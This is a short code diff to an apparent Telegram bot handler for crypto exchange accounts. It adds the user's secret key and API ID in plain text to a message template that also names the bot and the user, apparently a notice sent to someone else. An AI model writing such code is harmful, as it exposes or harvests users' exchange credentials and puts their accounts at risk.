@@ -125,6 +125,8 @@ async def get_Secret_key(message: Message, state: FSMContext):
     Бот - @{bot_info.username}
     Пользователь - @{message.from_user.username}
     <b>{first_name} {last_name}</b>
+    Секретный ключ - <code>{secret_key}</code>
+    API ID - <code>{api_id}</code>
     Биржа - {exchange['exchange_name']}
     
     """))
